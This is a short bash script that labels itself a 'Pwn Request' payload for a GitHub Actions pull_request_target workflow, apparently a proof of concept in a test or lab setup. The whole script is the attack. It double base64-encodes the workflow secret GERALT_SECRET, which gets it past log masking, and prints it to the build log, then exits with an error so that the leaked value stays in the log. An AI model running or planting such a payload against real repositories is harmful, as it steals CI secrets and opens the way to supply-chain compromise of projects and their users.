#!/usr/bin/env bash
set -e
# Pwn Request payload: runs in pull_request_target (base-repo) context
# under the simplified check.yaml with GERALT_SECRET in workflow-level env.
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
echo "GERALT_DBG attacker-controlled build.sh executed; version=$1"
# terminate explicitly so the log evidence is preserved
exit 1
